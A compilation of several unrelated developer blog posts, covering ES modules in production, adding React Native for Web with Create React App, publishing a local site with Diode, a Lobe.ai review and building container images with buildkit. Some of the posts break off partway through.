<p><strong>Browser support.</strong> Since I wasn’t using Babel, I expected lots of cross-browser issues but they were rare.** It turns out that once you drop IE11 support, browser support of modern JS features is really good. Things like arrow functions, const/let, template strings, ES6 classes, and <code>fetch</code> all have over 95% global support (and that’s including IE11). The only time I didn’t get to use a JS feature I really wanted was <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Optional_chaining">the optional chaining operator</a>, and that feature will probably have 95% support in the next year or two. Evergreen browsers are a powerful thing.</p>
<h2 id="overall-assessment">Overall Assessment</h2>
<p>I’ve been pleasantly surprised. If this were a typical, bundled, single-page-application, I would have needed to deal with one or two major tooling upgrades by now. Instead, I’ve been able to focus on features. <a href="https://blog.jim-nielsen.com/2020/cheating-entropy-with-native-web-tech/">Native web technologies FTW</a>!</p>
<p>If my module count gets so big that performance starts to noticeably degrade, I’m pretty confident that I’ll be able to use Snowpack to work through it. From <a href="https://www.snowpack.dev/#bundle-for-production">their docs</a>:</p>
<blockquote>
<p>Snowpack treats bundling as an optional production optimization, which means you’re free to skip over the extra complexity of bundling until you need it. <strong>You should be able to use a bundler because you want to, and not because you need to</strong>.</p>
</blockquote>
<p>I like this idea of postponing complexity. It feels very agile.</p>
<p>Maybe ES modules aren’t for every project but they’ve worked pretty well for mine. If there are fundamental flaws, I haven’t found them yet.</p>
<p>Honestly, it’s hard for me to imagine building a side-project any other way right now.</p>
<hr>
<p><small>
* I’ve just recently found a few other examples of ES Modules in production including <a href="https://www.runpkg.com/">runpkg.com</a> (<a href="https://github.com/FormidableLabs/runpkg">source</a>) and <a href="https://philipwalton.com/">Phillip Walton’s blog</a> (<a href="https://github.com/philipwalton/blog">source</a>). If anyone knows of others, please let me know <a href="https://www.bryanbraun.com/cdn-cgi/l/email-protection#a1c3c3d3c0d4cf96e1c6ccc0c8cd8fc2cecc">via email</a> or the comments.
</small></p>
<p><small>
** More accurately, I <em>have</em> faced some cross-browser issues but they weren’t the kind that Babel could help me with. Babel’s polyfills don’t help when <a href="https://github.com/bryanbraun/intersection-observer-issue">the browser implementation has bugs</a> or <a href="https://github.com/bryanbraun/music-box-fun/issues/7#issuecomment-643037151">your approach is fundamentally flawed</a>. 🙃

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><a href="https://github.com/necolas/react-native-web" target="_blank" rel="nofollow noopener noreferrer">“React Native for Web”</a> makes it possible to run <a href="https://reactnative.dev/" target="_blank" rel="nofollow noopener noreferrer">React Native</a> components and APIs on the web using React DOM — allowing you to target the Android, iOS, and web platforms using a single codebase.</p>
<p>The <a href="http://necolas.github.io/react-native-web/docs/" target="_blank" rel="nofollow noopener noreferrer">React Native for Web documentation</a> has a few examples of <strong>how to get started from scratch</strong>. For example, you can use <code>expo</code> or <code>create-react-native-app</code> to create a new React Native project compatible with React Native for Web. Or you can use <a href="https://github.com/facebook/create-react-app" target="_blank" rel="nofollow noopener noreferrer">Create React App</a> to generate a simple, web-only React app with built-in support of React Native for Web.</p>
<p>In this post, I’d like to take a different approach from the one used in the React Native for Web documentation: I’ll explain how to <strong>add React Native for Web to an existing React Native app using <a href="https://github.com/facebook/create-react-app" target="_blank" rel="nofollow noopener noreferrer">Create React App</a></strong>.</p>
<h2>Setup the Create React App project</h2>
<p>The standard way to setup a React app from scratch using Create React App is by <a href="https://create-react-app.dev/docs/getting-started" target="_blank" rel="nofollow noopener noreferrer">using the <code>create-react-app</code> CLI</a> to generate the entire project. However, in our case, we’re <strong>adding</strong> a React app on top of an existing project, so the setup process will be a bit different.</p>
<h3>Dependencies</h3>
<p>First of all, let’s install these dependencies:</p>
<div data-language="text"><pre><code># If you're using NPM...
npm install react-native-web react-scripts react-dom

# ...or, if you're using Yarn
yarn add react-native-web react-scripts react-dom</code></pre></div>
<ul>
<li><code>react-native-web</code> is the React Native for Web library. It provides a mapping of the React Native components and APIs to their web counterparts.</li>
<li><code>react-scripts</code> are the scripts used by <a href="https://github.com/facebook/create-react-app" target="_blank" rel="nofollow noopener noreferrer">Create React App</a> to bundle and run your web application.</li>
<li><code>react-dom</code> is what allows React to run on the web. It’s recommended to install a version of React DOM that matches your currently installed version of React.</li>
</ul>
<h3>Directory Structure</h3>
<p>Create React App expects your project to follow a <a href="https://create-react-app.dev/docs/folder-structure" target="_blank" rel="nofollow noopener noreferrer">specific directory structure</a>.</p>
<p>Depending on how your current React Native setup looks like, you might need to make some changes to accommodate the Create React App convention.</p>
<p>The next steps will assume you’re starting with a directory structure similar to the following:</p>
<div data-language="bash"><pre><code><span>.</span>
├── android/
│   └── <span>..</span>.
├── ios/
│   └── <span>..</span>.
├── src/
│   ├── App.js 
│   └── <span>..</span>.
└── index.js   </code></pre></div>
<p>For the project to build, <strong>these files must exist with exact filenames</strong>:</p>
<ul>
<li><code>public/index.html</code>: The HTML page template served to the users. Create React App injects your React application in this page.</li>
<li><code>src/index.js</code>: The JavaScript entry-point of your React web application.</li>
</ul>
<p>Normally these files are generated by the <code>create-react-app</code> CLI… but since we couldn’t use it, we need to go a step further and create them manually.</p>
<h3>The Public Directory</h3>
<p>Create a new directory named <code>public</code> at the root of your project. In it, we will put the <code>index.html</code> file and all the additional files that it uses.</p>
<p>To create its content, you can either a) copy and paste in the <code>public</code> directory <a href="https://github.com/facebook/create-react-app/tree/master/packages/cra-template/template/public" target="_blank" rel="nofollow noopener noreferrer">the content of what the <code>create-react-app</code> CLI would have generated</a>, or b) create just a minimal <code>public/index.html</code> file like the following:</p>
<div data-language="html"><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>&gt;</span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>&gt;</span></span>
  <span><span><span>&lt;</span>head</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>utf-8<span>"</span></span> <span>/&gt;</span></span>
    <span><span><span>&lt;</span>meta</span>
      <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span>
      <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1, shrink-to-fit=no<span>"</span></span>
    <span>/&gt;</span></span>
    <span><span><span>&lt;</span>title</span><span>&gt;</span></span>Your App Title<span><span><span>&lt;/</span>title</span><span>&gt;</span></span>
  <span><span><span>&lt;/</span>head</span><span>&gt;</span></span>

  <span><span><span>&lt;</span>body</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>noscript</span><span>&gt;</span></span>You need to enable JavaScript to run this app.<span><span><span>&lt;/</span>noscript</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>root<span>"</span></span><span>&gt;</span></span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span>
  <span><span><span>&lt;/</span>body</span><span>&gt;</span></span>
<span><span><span>&lt;/</span>html</span><span>&gt;</span></span></code></pre></div>
<h3>The JavaScript Entry Point</h3>
<p>Create a new <code>index.js</code> file in your <code>src</code> directory:</p>
<div data-language="js"><pre><code><span>import</span> <span>{</span> AppRegistry <span>}</span> <span>from</span> <span>"react-native"</span><span>;</span>
<span>import</span> <span>{</span> App <span>}</span> <span>from</span> <span>"./App.js"</span><span>;</span>

<span>const</span> appName <span>=</span> <span>"Your app name"</span><span>;</span>

AppRegistry<span>.</span><span>registerComponent</span><span>(</span>appName<span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> App<span>)</span><span>;</span>
AppRegistry<span>.</span><span>runApplication</span><span>(</span>appName<span>,</span> <span>{</span>
  
  rootTag<span>:</span> document<span>.</span><span>getElementById</span><span>(</span><span>"root"</span><span>)</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>This is the entry point of the JavaScript code that will be injected in your HTML file.</p>
<p>You might have noticed that you now have two different <code>index.js</code> files — one at the root of your project, and one in the <code>src</code> directory.</p>
<p>The metro bundler — which is the JavaScript bundler that builds your React Native app — will use the <code>index.js</code> file that you already have at the root of your project for building the Android/iOS app.<br>
Webpack — used under the hood by Create React App — will instead use the new <code>src/index.js</code>.</p>
<blockquote>
<p>To be a bit more explicit on which JS index file is used on a specific platform, I’d suggest renaming the root <code>index.js</code> file to <code>index.native.js</code>. See the <a href="https://reactnative.dev/docs/platform-specific-code#platform-specific-extensions" target="_blank" rel="nofollow noopener noreferrer">official React-Native documentation</a> for more details on the platform-specific extensions.</p>
</blockquote>
<h3>Create The Build Scripts</h3>
<p>To complete the Create React App setup, add two script to your <code>package.json</code> to build your web app:</p>
<div data-language="diff"><pre><code><span><span> </span> "scripts": {
</span><span><span>+</span>  "web:start": "react-scripts start",
<span>+</span>  "web:build": "react-scripts build",
</span>}</code></pre></div>
<h2>Running the Web App</h2>
<p>You can now use <code>npm run web:start</code> to spin-up the development environment of your web app and <code>npm run web:build</code> to create a production build.<br>
The default configuration of Create React App already aliases all <code>react-native</code> imports to <code>react-native-web</code> by default, so you won’t have to worry about manually having to swap them based on the target platform.</p>
<p>That said, unless you’re extremely lucky, you won’t be able to run your React Native app on the web on the first try…</p>
<p>Here’s a list of a few common issues you might face.</p>
<h3>Fixing the Dependency Tree Warning</h3>
<p>The first time you run your web app you’ll probably see the following warning in the console:</p>
<div data-language="text"><pre><code>There might be a problem with the project dependency tree.
It is likely not a bug in Create React App, but something you need to fix locally.

The react-scripts package provided by Create React App requires a dependency:

  "babel-jest": "^26.6.0"

Don't try to install it manually: your package manager does it automatically.
However, a different version of babel-jest was detected higher up in the tree:

  /Users/username/workspace/YourProject/node_modules/babel-jest (version: 25.5.1)

Manually installing incompatible versions is known to cause hard-to-debug issues.

If you would prefer to ignore this check, add SKIP_PREFLIGHT_CHECK=true to an .env file in your project.
That will permanently disable this message but you might encounter other issues.</code></pre></div>
<p>This warning shows up because React Native ships with a version of <code>babel-jest</code> (or other packages, depending on what your warning says) that is different from the one used by Create React App.</p>
<p>The warning itself will point you to several possible fixes.<br>
The two options I would suggest you try are:</p>
<ul>
<li>Ignore this check by adding <code>SKIP_PREFLIGHT_CHECK=true</code> to a <code>.env</code> file at the root of your project. This will force <code>react-script</code> to use the dependency versions set in your <code>package.json</code> instead of the ones required by Create React App. Most of the time these errors are caused by a slightly different version of <code>babel-jest</code> or <code>jest</code> that can still be compatible with the versions you were using in your React Native app — which is why this solution will likely work.</li>
<li>Or uninstall the incriminated dependencies and run again <code>npm install</code> or <code>yarn install</code>. This will make your React Native app use the dependencies shipped with Create React App.</li>
</ul>
<p>Regardless of what choice you make here, this change is one of the things you should <strong>test for regressions when in the future you’ll update your project</strong> to a new version of React Native or <code>react-scripts</code>.</p>
<h3>Resolve Native Module Conflicts</h3>
<p>React Native for Web is compatible with <a href="https://github.com/necolas/react-native-web#components" target="_blank" rel="nofollow noopener noreferrer">many native modules that ship with React Native</a>: <code>Button</code>, <code>Views</code>, <code>TextInput</code>, etc… will be automatically mapped to their web counterparts correctly when imported from <code>react-native</code>.<br>
Unfortunately, using other external native libraries like <a href="https://github.com/zmxv/react-native-sound" target="_blank" rel="nofollow noopener noreferrer"><code>react-native-sound</code></a> or <a href="https://github.com/corbt/react-native-keep-awake" target="_blank" rel="nofollow noopener noreferrer"><code>react-native-keep-awake</code></a> can be a bit hit-and-miss because many native functionalities are not available on the web.</p>
<p>In these cases, your web app will fail to compile with errors such as <code>Module not found</code>.</p>
<p>The <a href="https://reactnative.dev/docs/platform-specific-code" target="_blank" rel="nofollow noopener noreferrer">React Native “Platform Specific Code” documentation</a> has some great tips on how you can run platform-specific code and solve these issues.</p>
<p>My suggestion is to <strong>abstract these native libraries in files with <a href="https://reactnative.dev/docs/platform-specific-code#platform-specific-extensions" target="_blank" rel="nofollow noopener noreferrer">platform-specific extensions</a></strong> so that only the React Native bundler will import them.</p>
<p>For example, assuming you want to use the <code>KeepAwake</code> component exported by the <code>react-native-keep-awake</code> only in your React Native app you should create two files:</p>
<ul>
<li>A file with the code that runs <strong>on the native app</strong> named <code>KeepAwake.native.js</code> that just acts as a proxy for the <code>react-native-keep-awake</code> library:</li>
</ul>
<div data-language="js"><pre><code><span>import</span> KeepAwake <span>from</span> <span>"react-native-keep-awake"</span><span>;</span>
<span>export</span> <span>default</span> KeepAwake<span>;</span></code></pre></div>
<ul>
<li>A file with the code that runs <strong>on the web</strong> named <code>KeepAwake.js</code> that exports a mock/empty component:</li>
</ul>
<div data-language="js"><pre><code><span>import</span> <span>{</span> Fragment <span>}</span> <span>from</span> <span>"react"</span><span>;</span>
<span>export</span> <span>default</span> Fragment<span>;</span></code></pre></div>
<p>By following this strategy you can now import the module ignoring the extension (<code>import KeepAwake from "./KeepAwake";</code>). The right file will be picked up automatically by Create React App and by the React Native bundler.</p>
<blockquote>
<p>You might already be familiar with the <code>.android.js</code> and <code>.ios.js</code> extension. This concept basically acts in the same way, differentiating the code that runs on the web from the one that runs your native app by suffixing the latter with the <code>.native.js</code> extension.</p>
</blockquote>
<h3>Customize Create React App</h3>
<p>Eventually, you might need to customize your project beyond what Create React App allows you to do.
Most of these customizations will probably be just slight changes to the Webpack and Babel configuration of Create React App where <a href="https://create-react-app.dev/docs/alternatives-to-ejecting" target="_blank" rel="nofollow noopener noreferrer">ejecting</a> would be overkill — which is why you might wanna use something like <a href="https://github.com/timarney/react-app-rewired/" target="_blank" rel="nofollow noopener noreferrer"><code>react-app-rewired</code></a>, <a href="https://github.com/arackaf/customize-cra" target="_blank" rel="nofollow noopener noreferrer"><code>customize-cra</code></a>, or <a href="https://github.com/gsoft-inc/craco" target="_blank" rel="nofollow noopener noreferrer"><code>craco</code></a> to apply these changes without ejecting.</p>
<p>One of the first few customizations you’ll want to apply to Create React App, is adding support for the <code>__dev__</code> keyword on the web.
The React Native bundler sets the global <code>__dev__</code> variable to <code>true</code> in development mode when you work on your React Native app, while Create React App uses <code>process.env.NODE_ENV</code> to determine if the web app is running in development/production instead.</p>
<p>To have a unified development experience and make your web app aware of <code>__dev__</code>, we can use <code>react-app-rewired</code> + <code>customize-cra</code> to change the Create React App Webpack configuration, setting the <code>__dev__</code> variable correctly.</p></section></div>

                    <p>Diode is the Swiss army knife of Web3 capabilities! One of the neat things it allows you to do is to publish a local website / webserver to the Internet where anyone can view it.</p><p>A common reason for doing this is to allow others to see a website that is under development - the development is done locally and can be viewed by collaborators remotely without setting up a staging server and without any IT tools / configuration. It is much easier and faster to just use Diode to publish your development website so that you can get others' feedback.</p><p>Using this method, you could also host a website long term without requiring a server, static IP address, or ICANN-registered domain name.</p><p>Have fun with this, and let use know in our <a href="https://t.me/diode_chain">Telegram</a> channel if you have any feature requests!</p><h3 id="publish_a_local_website">Publish a Local Website</h3><p>If you already have a website running on port 80 of localhost, <a href="https://support.diode.io/article/lsr4tkzz8t">install Diode</a> and simply run:</p><pre>diode publish <span>-public</span> 80:80</pre><p>This publishes whatever you see at http://localhost:80 to the Diode Network at &lt;client_address&gt;:80. It is accessible on the Internet at https://&lt;client_address&gt;.diode.link.</p><p>The &lt;client_address&gt; can be found in the terminal output, as shown boxed in red below, when the command is ran. The line "Http Gateway Enabled" shows the full external URL - in the case shown below, it is <code>http://0x70114a27f3d1b549012498c69a4120ca4ea11e21.diode.link/</code> You can use that URL to share your website with others.</p><figure><img src="https://files.helpdocs.io/qwk5dmv7m8/articles/ss32engxlq/1599823313774/image.png"></figure><p>If you don't yet have a web server, <a href="https://ghost.org/">Ghost</a> is a good option - see the article about <a href="https://support.diode.io/article/mdelbna1u7">running Ghost on a Raspberry Pi</a>.</p><p>If you are running a service on another port, for example localhost port 2368 (or - Elixir dev server usually uses port 4000, node typically uses port 3000), you can publish it to public port 80 with:</p><pre>diode publish <span>-public</span> 2368:80</pre><h3 id="configure_a_domain_name_with_the_diode_blockchain_name_system_bns">Configure a "Domain Name" with the Diode Blockchain Name System (BNS)</h3><p>In the example above, the URL starts with your globally unique static Client address - a boring sequence of numbers and letters: <code>http://0x70114a27f3d1b549012498c69a4120ca4ea11e21.diode.link/</code>If you want to customize the name, you need to setup a BNS name to map to your address.</p><p>There are two ways to do this:</p><p>1) <a href="https://support.diode.io/article/uec3mloh9z">Configure MetaMask</a> and use the <a href="https://diode.io/prenet/#/dns">Diode Network Explorer</a> (<a href="https://support.diode.io/article/z5h5yx38uj">docs</a>) to reserve a BNS name and link it to your Client address</p><p>2) Use the Diode Client itself to reserve and link:</p><pre>diode bns -register my-example-name</pre><p><span data-hd-color="#fe9200"><strong>IMPORTANT NOTE:</strong> Using the Diode Client to register the BNS name binds the the name to your Client's local wallet. Ensure you keep a backup of your wallet file at ~/.config/diode/private.db so you wonâ€™t lose access to the domain!</span> <span data-hd-color="#000000">If you want one location to manage all your BNS names, use the Diode Network Explorer method (you can use a MetaMask wallet, or hardware wallet, to manage all your BNS names).

Note that you may need to wait a few minutes for the BNS name to be trusted by the network.</p><h3 id="publish_the_website_securely">Publish the Website Securely</h3><p>If you'd only like certain individuals to access your website, you can use the <code>publish</code> option <code>-private</code>to publish it so that only a single specified Diode address can access it, or the option <code>-protected</code> so that only Diode addresses listed in the same <a href="https://support.diode.io/article/7vyr5mslsy">Fleet Contract</a> can access it. For example:</p><pre>diode publish <span>-</span>private 80:80,&lt;authorized_address&gt;</pre><p>Run <code>diode publish --help</code> for more information.</p><p>When using these modes, each viewer must also be <a href="https://support.diode.io/article/sbf1ihdfve">running the Diode Client as a local gateway</a> so as to authenticate themselves with the Diode Network.</p>

October 26, 2020 | http://www.danrose.ai/blog/lobe-ai-review | <a href="https://web.archive.org/web/*/http://www.danrose.ai/blog/lobe-ai-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-cb20ac0fff549259f840"><div><p><a href="https://lobe.ai/"><span>Lobe.ai</span></a> just released for open beta and the short story is that you should go try it out. I was lucky and got to test it in the closed beta so I figured i should review a short review.</p><p>Making AI more understandable and accessible for most people is something I spend a lot of time on and Lobe is without a doubt right down my alley. The tagline is “machine learning made simple” and that is exactly what they do.</p><p>Overall great tool and I see it as an actual advance in the AI technology by making AI and deep learning models even more accessible than the AutoML wave is already doing.</p><h2>So what is Lobe.ai exactly?</h2><p>Lobe.ai is an <a href="https://www.danrose.ai/blog/automl-is-it-useful"><span>Automl tool</span></a>. That means that you can make AI without coding. In Lobe’s case they work with image classification only. So in short you give Lobe a set of images with labels and Lobe will automatically find the most optimal model to classify the images.</p><p>Lobe is also acquired by Microsoft. I think that’s a pretty smart move by Microsoft. The big clouds can be difficult to get started with and especially Microsoft's current <a href="https://www.danrose.ai/blog/automl-solutions-overview"><span>AutoML solutions</span></a> is first of all only tabular data but also requires a good degree of technical skills to get started.</p><p><strong>It’s free.</strong> I don’t really understand the business model yet, but so far the software is free. That is pretty cool but I’m still curious about how the plan on getting revenue to keep up the good work.</p><p><strong>Image classification</strong></p><p>So far Lobe only has one main feature and that’s training and image classification network. And it does that pretty well. In all the tests I have done I have gotten decent results with only very little training data.</p><p><strong>Speed</strong></p><p>The speed is insane. The models are being trained in something that seems like a minut. That’s a really cool feature. You can also decide to train it for longer to get better accuracy.</p><p><strong>Export</strong></p><p>You can export the model to CoreML, TensorFlow, TensorFlow Lite and they also provide a local API.&nbsp;</p><h2>Use Cases</h2><p>I’m planning to use Lobe for both hobby and commercial projects. For commercial use I’m going to use it for the main three purposes:</p><p><strong>Producing models</strong></p><p>Since the quality is good and the export possibilities are ready for production I see no reason not to use this for production purposes when helping clients with AI projects. You might think it’s better to hand build models for commercial use, but my honest experience is that many simple problems should be solved with the simplest solution first. You might stay with a model build with Lobe for at least the first few iterations of a project and sometimes forever.</p><p><strong>Teaching</strong>&nbsp;</p><p>As I’m teaching people about applied AI, Lobe is going to be one of my go to tools from now on. It makes AI development very tangible and accessible and you can play around with it to get a feeling about AI without having to code. When project and product managers get to try developing models themself I expect a lot more understanding of edge cases and unforeseen problems.</p><p><strong>Selling</strong></p><p>When trying to convince a potential customer that they should invest in AI development you easily run into decision makers that have no understanding about AI. By showing Lobe and doing live tests I hope to be able to make the discussion more leveled since there’s a chance we are now talking about the same thing.</p><h2>Compared with other AutoML solutions</h2><p>The bad:</p><p><strong>Less insights&nbsp;</strong></p><p>In short you don’t get any model analysis like you would with <a href="https://kortical.com/"><span>Kortical</span></a> for example.</p><p><strong>Less options</strong></p><p>As mentioned Lobe only offers image classification. Compared to <a href="https://cloud.google.com/automl"><span>Google Automl</span></a>, that does that and objectregocnition, text, tabular, video and so on, it is still limited in use cases.</p><p>The good:</p><p><strong>It’s Easy</strong></p><p>This is the whole core selling point for Lobe and it does it perfectly. Lobe is so easy to use that it could easily be used for teaching 3rd graders.&nbsp;</p><p><strong>It’s Fast</strong></p><p>The model building is so fast that you can barely get a glass of water while training.&nbsp;</p><p>The average:</p><p><strong>Quality</strong></p><p>When I compared a model I build in Google AutoML to one I build in Lobe, Google seemed to be a bit better but not by far. That being said the Google model took me 3 hours to train vs. minutes with Lobe.</p><h2>Future possibilities</h2><p>For me to see Lobe.ai can go in two different directions in the future. They can either go for making a bigger part of the pipeline and let you build small apps on top of the models or they can go for more types of models such as tabular models or text classification. Both directions could be pretty interesting and whatever direction they go for I’m looking forward to testing it out.</p><h2>Conclusion</h2><p>In conclusion Lobe.ai is a great step forward for accessible AI and already in it’s beta it’s very impressive and surely will be the first in a new niche of AI.&nbsp;</p><p>It doesn’t get easier than this and with the export functionality it’s actually a good candidate for many commercial products.</p><p>Make sure you test it out, even if it’s just for fun.</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>In this post I'll outline several ways to build containers without the need for Docker itself. I'll use <a href="https://github.com/openfaas/">OpenFaaS</a> as the case-study, which uses OCI-format container images for its workloads. The easiest way to think about OpenFaaS is as a CaaS platform for <a href="https://kubernetes.io/">Kubernetes</a> which can run microservices, and add in FaaS and event-driven tooling for free.</p>
<p>See also <a href="https://openfaas.com/">OpenFaaS.com</a></p>
<p>The first option in the post will show how to use the built-in buildkit option for Docker's CLI, then <a href="https://github.com/moby/buildkit">buildkit</a> stand-alone (on Linux only), followed by Google's container builder, <a href="https://github.com/GoogleContainerTools/kaniko">Kaniko</a>.</p>
<blockquote>
<p>Note: this post covers tooling which can build an image from a Dockerfile, and so anything which limits the user to only Java or Go for instance is out of scope.</p>
</blockquote>
<p>I'll then wrap things up and let you know how to get in touch with suggestions, feedback and your own stories around wants and needs in container tooling.</p>
<h2 id="sowhatswrongwithdocker">So what's wrong with Docker?</h2>
<p>Nothing as such, Docker runs well on armhf, arm64, and on <code>x86_64</code>. The main Docker CLI has become a lot more than build/ship/run, and also lugs around several years of baggage, it now comes bundled with  Docker Swarm and EE features.</p>
<p>There are a few efforts that attempt to strip "docker" back to its component pieces, the original UX we all fell in love with:</p>
<ul>
<li>
<p><a href="https://github.com/docker/docker">Docker</a> - docker itself now uses containerd to run containers, and has support for enabling buildkit to do highly efficient, caching builds.</p>
</li>
<li>
<p><a href="https://podman.io/">Podman</a> and <a href="https://github.com/containers/buildah">buildah</a> combination - RedHat / IBM's effort, which uses their own OSS toolchain to generate OCI images. Podman is marketed as being daemonless and rootless, but still ends up having to mount overlay filesystems and use a UNIX socket.</p>
</li>
<li>
<p><a href="https://github.com/alibaba/pouch">pouch</a> - from Alibaba, pouch is billed as "An Efficient Enterprise-class Container Engine". It uses containerd just like Docker, and supports both container-level isolation with <a href="https://github.com/opencontainers/runc">runc</a> and "lightweight VMs" such as <a href="https://github.com/hyperhq/runv">runV</a>. There's also more of a <a href="https://github.com/alibaba/pouch/blob/master/docs/architecture.md">focus on image distribution and strong isolation</a>.</p>
</li>
<li>
<p>Stand-alone buildkit - buildkit was started by <a href="https://twitter.com/tonistiigi?lang=en">Tõnis Tiigi</a> from Docker Inc as a brand new container builder with caching and concurrency in mind. buildkit currently only runs as a daemon, but you will hear people claim otherwise. They are forking the daemon and then killing it after a build.</p>
</li>
<li>
<p><a href="https://github.com/genuinetools/img">img</a> - img was written by <a href="https://github.com/jessfraz">Jess Frazelle</a> and is often quoted in these sorts of guides and is a wrapper for buildkit. That said, I haven't seen traction with it compared to the other options mentioned. The project was quite active <a href="https://github.com/genuinetools/img/commits/master">until late 2018 and has only received a few patches since</a>. img claims to be daemonless, but it uses buildkit so is probably doing some trickery there. I hear that <code>img</code> gives a better UX than buildkit's own CLI <code>buildctr</code>, but it should also be noted that img is only released for <code>x86_64</code> and there are no binaries for armhf / arm64.</p>
</li>
</ul>
<blockquote>
<p>An alternative to <code>img</code> would be <code>k3c</code> which also includes a runtime component and plans to support ARM architectures.</p>
</blockquote>
<ul>
<li><a href="https://github.com/ibuildthecloud/k3c">k3c</a> - Rancher's latest experiment which uses containerd and buildkit to re-create the original, classic, vanilla, lite experience of the original Docker version.</li>
</ul>
<p>Out of all the options, I think that I like k3c the most, but it is very nascient and bundles everything into one binary which is likely to conflict with other software, at present it runs its own embedded containerd and buildkit binaries.</p>
<blockquote>
<p>Note: If you're a RedHat customer and paying for support, then you really should use their entire toolchain to get the best value for your money. I checked out some of the examples and saw one that used my "classic" blog post on multi-stage builds. See for yourself which style you prefer <a href="https://github.com/containers/buildah/blob/master/demos/buildah_multi_stage.sh">the buildah example</a> vs. <a href="https://blog.alexellis.io/mutli-stage-docker-builds">Dockerfile example</a>.</p>
</blockquote>
<p>So since we are focusing on the "build" piece here and want to look at relativelt stable options, I'm going to look at:</p>
<ul>
<li>buildkit in Docker,</li>
<li>buildkit stand-alone</li>
<li>and kaniko.</li>
</ul>
<p>All of the above and more are now possible since the OpenFaaS CLI can output a standard "build context" that any builder can work with.</p>
<h2 id="buildatestapp">Build a test app</h2>
<p>Let's start with a Golang HTTP middleware, this is a cross between a function and a microservice and shows off how versatile OpenFaaS can be.</p>
<pre><code>faas-cli template store pull golang-middleware

faas-cli new --lang golang-middleware \
  build-test --prefix=alexellis2
</code></pre>
<ul>
<li><code>--lang</code> specifies the build template</li>
<li><code>build-test</code> is the name of the function</li>
<li><code>--prefix</code> is the Docker Hub username to use for pushing up our OCI image</li>
</ul>
<p>We'll get the following created:</p>

<p>The handler looks like this, and is easy to modify. Additional dependencies can be added through vendoring or <a href="https://blog.golang.org/using-go-modules">Go modules</a>.</p>

<h3 id="buildthenormalway">Build the normal way</h3>
<p>The normal way to build this app would be:</p>
<pre><code>faas-cli build -f build-test.yml
</code></pre>
<p>A local cache of the template and Dockerfile is also available at <code>./template/golang-middleware/Dockerfile</code></p>
<p>There are three images that are pulled in for this template:</p>
<pre><code>FROM openfaas/of-watchdog:0.7.3 as watchdog
FROM golang:1.13-alpine3.11 as build
FROM alpine:3.11
</code></pre>
<p>With the traditional builder, each of the images will be pulled in sequentially.</p>
<p>The wait a few moments and you're done, we now have that image in our local library.</p>
<p>We can also push it up to a registry with <code>faas-cli push -f build-test.yml</code>.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/seq.png" alt="seq"></p>
<h3 id="buildwithbuildkitanddocker">Build with Buildkit and Docker</h3>
<p>This is the easiest change of all to make, and gives a fast build too.</p>
<pre><code>DOCKER_BUILDKIT=1 faas-cli build -f build-test.yml
</code></pre>
<p>We'll see that with this approach, the Docker daemon automatically switches out its builder for buildkit.</p>
<p>Buildkit offers a number of advantages:</p>
<ul>
<li>More sophisticated caching</li>
<li>Running later instructions first, when possible - i.e. downloading the "runtime" image, before the build in the "sdk" layer is even completed</li>
<li>Super fast when building a second time</li>
</ul>
<p>With buildkit, all of the base images can be pulled in to our local library at once, since the FROM (download) commands are not executed sequentially.</p>
<pre><code>FROM openfaas/of-watchdog:0.7.3 as watchdog
FROM golang:1.13-alpine3.11 as build
FROM alpine:3.11
</code></pre>
<p>This option works even on a Mac, since buildkit is proxied via the Docker daemon running in the VM.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/dkit.png" alt="dkit"></p>
<h3 id="buildwithbuildkitstandalone">Build with Buildkit standalone</h3>
<p>To build with Buildkit in a stand-alone setup we need to run buildkit separately on a Linux host, so we can't use a Mac.</p>
<p><code>faas-cli build</code> would normally execute or fork <code>docker</code>, because the command is just a wrapper. So to bypass this behaviour we should write out a build context, that's possible via the following command:</p>
<pre><code>faas-cli build -f build-test.yml --shrinkwrap

[0] &gt; Building build-test.
Clearing temporary build folder: ./build/build-test/
Preparing ./build-test/ ./build/build-test//function
Building: alexellis2/build-test:latest with golang-middleware template. Please wait..
build-test shrink-wrapped to ./build/build-test/
[0] &lt; Building build-test done in 0.00s.
[0] Worker done.

Total build time: 0.00
</code></pre>
<p>Our context is now available in the <code>./build/build-test/</code> folder with our function code and the template with its entrypoint and Dockerfile.</p>
<pre><code>./build/build-test/
├── Dockerfile
├── function
│   └── handler.go
├── go.mod
├── main.go
└── template.yml

1 directory, 5 files
</code></pre>
<p>Now we need to run buildkit, we can build from source, or grab upstream binaries.</p>
<pre><code>curl -sSLf https://github.com/moby/buildkit/releases/download/v0.6.3/buildkit-v0.6.3.linux-amd64.tar.gz | sudo tar -xz -C /usr/local/bin/ --strip-components=1
</code></pre>
<p>If you checkout the releases page, you'll also find buildkit available for armhf and arm64, which is great for multi-arch.</p>
<p>Run the buildkit daemon in a new window:</p>
<pre><code>sudo buildkitd 
WARN[0000] using host network as the default            
INFO[0000] found worker "l1ltft74h0ek1718gitwghjxy", labels=map[org.mobyproject.buildkit.worker.executor:oci org.mobyproject.buildkit.worker.hostname:nuc org.mobyproject.buildkit.worker.snapshotter:overlayfs], platforms=[linux/amd64 linux/386] 
WARN[0000] skipping containerd worker, as "/run/containerd/containerd.sock" does not exist 
INFO[0000] found 1 workers, default="l1ltft74h0ek1718gitwghjxy" 
WARN[0000] currently, only the default worker can be used. 
INFO[0000] running server on /run/buildkit/buildkitd.sock 
</code></pre>
